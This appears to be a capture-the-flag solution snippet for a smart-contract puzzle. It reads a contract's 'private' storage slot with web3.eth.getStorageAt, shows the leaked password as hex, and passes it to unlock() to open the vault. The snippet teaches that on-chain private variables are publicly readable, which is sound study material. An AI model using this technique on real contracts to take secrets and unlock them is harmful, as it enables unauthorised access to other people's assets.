//private storage variable does not mean it cannot be read from outside world

await web3.eth.getStorageAt('0x81fa826C9904a911c49695cF9EbB8a76F094bd7D',1) //put your instance addr
//0x412076657279207374726f6e67207365637265742070617373776f7264203a29

await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')